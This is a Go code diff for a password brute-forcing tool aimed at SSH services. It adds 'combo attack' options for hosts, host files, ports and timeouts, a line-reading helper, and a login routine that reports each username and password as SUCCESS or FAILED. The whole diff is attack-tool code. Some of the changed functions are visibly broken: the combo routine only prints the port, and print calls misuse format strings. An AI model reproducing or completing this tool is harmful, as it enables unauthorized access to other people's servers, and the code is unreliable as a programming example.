@@ -9,7 +9,6 @@ import (
 	"log"
 	"fmt"
 	"errors"
-	"strings"
 	"sync"
 	"time"
 	"os"
@@ -29,18 +28,26 @@ sshSubcommands = []cli.Command{
 			Flags: []cli.Flag {
 				cli.StringFlag {
 					Name:  "file, f",
-					Usage: "combo file in: HOST:USER:PASS format",
+					Usage: "run combo file attack",
+				},
+				cli.StringFlag {
+					Name: "host",
+					Usage: "insert for combo attack",
 				},
 				cli.StringFlag {
 					Name:  "port",
 					Usage: "port for combo attack",
 					Value: "22",
 					},
+				cli.StringFlag {
+					Name: "hostfile, H",
+					Usage: "insert host file for combo attack",
+				},
 				cli.IntFlag {
 					Name: "timeout, t",
 					Usage: "set timeout for ssh connection; default 300ms",
 					Value: 300,
-				},	
+				},
 			},
 		},
 		{
@@ -83,10 +90,10 @@ sshSubcommands = []cli.Command{
 					Value: 300,
 					},
 				},
-			},		
+			},
 	}
 
-sshBrute = cli.Command { 
+sshBrute = cli.Command {
 			Name:		 "ssh",
 			Usage:		 "bruteforces SSH services",
 			Subcommands: sshSubcommands,
@@ -99,7 +106,7 @@ type resp struct {
 }
 
 type fileScanner struct {
-	File 	*os.File
+	File	*os.File
 	Scanner *bufio.Scanner
 }
 
@@ -128,6 +135,20 @@ func (f *fileScanner) GetScan() *bufio.Scanner {
 	return f.Scanner
 }
 
+func readLines(path string) ([]string, error) {
+	file, err := os.Open(path)
+	if err != nil {
+		return nil, err
+	}
+	defer file.Close()
+
+	var lines []string
+	scanner := bufio.NewScanner(file)
+	for scanner.Scan() {
+		lines = append(lines, scanner.Text())
+	}
+	return lines, scanner.Err()
+}
 
 func sshAuth(username string, password string, host string, port string, timer int) *resp {
 	respond := &resp{}
@@ -139,74 +160,39 @@ func sshAuth(username string, password string, host string, port string, timer i
 	}
 	_, err := ssh.Dial("tcp", host+":"+ port, clientConf)
 	if err != nil {
-		fmt.Printf("\nUser: %s Password: %s [%s]", username, password, color.RedString("FAILED"))
-	} else if err == nil {
-//		end := time.Now()
-//		d := end.Sub(inittime)
-//		duration := d.Seconds()
-		fmt.Printf("\nUser: %s Password: %s [%s]", username, password, color.GreenString("SUCCESS"))
+		fmt.Fprint(color.Output, "\nUser: %s Password: %s [%s]", username, password, color.RedString("FAILED"))
+	} else {
+		end := time.Now()
+		d := end.Sub(inittime)
+		duration := d.Seconds()
+		fmt.Fprint(color.Output, "\n[%s] User: %s Password: %s [%s] [%v]", end, username, password, color.GreenString("SUCCESS"), duration)
 	}
 	respond.Error = err
 	return respond
 }
 
-
 func sshCombo(c *cli.Context) error {
-	if c.String("file") == "" {
-	return errors.New("must supply a combo file to this command")
+	if c.Args().First() == "" {
+		return errors.New("must supply a combo file to this command")
 	}
-	if c.String("file") != "" {
-		combofile := newFileScanner()
-		err := combofile.Open(c.String("file"))
-		if err != nil {
-			log.Fatal(err)
-		}
-		comboscanner := combofile.GetScan()
-		for comboscanner.Scan() {
-			combosplice := strings.Split(comboscanner.Text(), ":")
-			host,user,password := combosplice[0],combosplice[1],combosplice[2]
-			resp := sshAuth(user,password,host,c.String("port"),c.Int("timeout"))
-			resp.mu.Lock()
-			if resp.Error == nil {
-				resp.mu.Unlock()
-			}
-		}
-	}
+	fmt.Println(c.String("port"))
 	return nil
 }
 
-
 func sshPlaintext(c *cli.Context) error {
 	if c.String("userfile") != "" {
-		uscanner := newFileScanner()
-		err := uscanner.Open(c.String("userfile"))
+		users, err := readLines(c.String("userfile"))
 		if err != nil {
-			log.Fatal(err)
+			log.Fatalf("readLines: %s", err)
 		}
-		//fmt.Printf("%s", content)
-		if c.String("passfile") != "" {
-			pscanner := newFileScanner()
-			err := pscanner.Open(c.String("passfile"))
+		for user := range users {
+			passwords, err := readLines(c.String("passfile"))
 			if err != nil {
-				log.Fatal(err)
+				log.Fatalf("readLines: %s", err)
 			}
-			userscanner := uscanner.GetScan()
-			passscanner := pscanner.GetScan()
-			for userscanner.Scan() {
-				userPlaintext := userscanner.Text()
-				fmt.Println(userPlaintext)
-				for passscanner.Scan() {
-					passPlaintext := passscanner.Text()
-					fmt.Println(passPlaintext)
-				}
-
+			for password := range passwords {
+				fmt.Println(users[user], passwords[password] )
 			}
-			}
-		} else if c.String("user") != "" {
-		resp := sshAuth(c.String("user"),c.String("password"),c.String("host"),c.String("port"),c.Int("timeout"))
-		resp.mu.Lock()
-		if resp.Error == nil {
-			resp.mu.Unlock()
 		}
 	}
 	return nil
